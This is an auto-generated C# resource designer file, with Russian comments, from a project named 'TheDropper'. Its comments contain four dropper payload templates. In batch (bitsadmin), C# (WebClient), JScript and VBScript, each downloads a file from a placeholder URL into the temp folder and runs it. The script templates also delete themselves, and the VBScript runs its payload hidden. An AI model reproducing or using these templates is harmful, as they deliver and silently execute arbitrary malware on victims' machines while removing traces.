﻿//------------------------------------------------------------------------------
// <auto-generated>
//     Этот код создан программой.
//     Исполняемая версия:4.0.30319.42000
//
//     Изменения в этом файле могут привести к неправильной работе и будут потеряны в случае
//     повторной генерации кода.
// </auto-generated>
//------------------------------------------------------------------------------

namespace TheDropper.Properties {
    using System;
    
    
    /// <summary>
    ///   Класс ресурса со строгой типизацией для поиска локализованных строк и т.д.
    /// </summary>
    // Этот класс создан автоматически классом StronglyTypedResourceBuilder
    // с помощью такого средства, как ResGen или Visual Studio.
    // Чтобы добавить или удалить член, измените файл .ResX и снова запустите ResGen
    // с параметром /str или перестройте свой проект VS.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Возвращает кэшированный экземпляр ResourceManager, использованный этим классом.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("TheDropper.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Перезаписывает свойство CurrentUICulture текущего потока для всех
        ///   обращений к ресурсу с помощью этого класса ресурса со строгой типизацией.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на @echo off
        ///title Update...
        ///color f
        ///set pOut=&quot;%temp%\\{0}&quot;
        ///bitsadmin /transfer &quot;mdj&quot; /download /priority FOREGROUND &quot;{1}&quot; %pOut%
        ///start &quot;&quot; %pOut%
        ///DEL &quot;%~f0&quot;.
        /// </summary>
        internal static string batch_payload {
            get {
                return ResourceManager.GetString("batch_payload", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Net;
        ///using System.Reflection;
        ///using System.Diagnostics;
        ///
        ///namespace Dropper
        ///{
        ///    class Program
        ///    {
        ///        public static void Main()
        ///        {
        ///            // Download payload
        ///            string tmp = Path.Combine(Path.GetTempPath(), &quot;{PAYLOAD_NAME}&quot;);
        ///            try
        ///            {
        ///                using (var wc = new WebClient())
        ///                {
        ///                    wc.DownloadFile(&quot;{PAYLOAD_URL}&quot;, tmp);
        ///                }
        ///            } catch  [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string exe_payload {
            get {
                return ResourceManager.GetString("exe_payload", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на var pOut = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(2) + &quot;\\{0}&quot;;
        ///var Object = WScript.CreateObject(&apos;MSXML2.XMLHTTP&apos;);
        ///Object.Open(&apos;GET&apos;, &quot;{1}&quot;, false);
        ///Object.Send();
        ///var Stream = WScript.CreateObject(&apos;ADODB.Stream&apos;);
        ///Stream.Open();
        ///Stream.Type = 1;
        ///Stream.Write(Object.ResponseBody);
        ///Stream.Position = 0;
        ///Stream.SaveToFile(pOut, 2);
        ///Stream.Close();
        ///new ActiveXObject(&quot;Shell.Application&quot;).ShellExecute(pOut,&quot;&quot;,&quot;&quot;,&quot;open&quot;,&quot;1&quot;);
        ///new ActiveXObject(&quot;Scripting.FileSystemObject&quot;).D [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string js_payload {
            get {
                return ResourceManager.GetString("js_payload", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на dim pOut, xHttp, bStrm
        ///pOut = WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(2) &amp; &quot;\\{0}&quot;
        ///Set xHttp = CreateObject(&quot;Microsoft.XMLHTTP&quot;)
        ///Set bStrm = CreateObject(&quot;Adodb.Stream&quot;)
        ///xHttp.Open &quot;GET&quot;, &quot;{1}&quot;, False
        ///xHttp.Send
        ///with bStrm
        ///    .type = 1
        ///    .open
        ///    .write xHttp.responseBody
        ///    .savetofile pOut, 2
        ///end with
        ///CreateObject(&quot;Wscript.Shell&quot;).Run &quot;&quot;&quot;&quot; &amp; pOut &amp; &quot;&quot;&quot;&quot;, 0, False
        ///CreateObject(&quot;Scripting.FileSystemObject&quot;).DeleteFile WScript.ScriptFullName.
        /// </summary>
        internal static string vbs_payload {
            get {
                return ResourceManager.GetString("vbs_payload", resourceCulture);
            }
        }
    }
}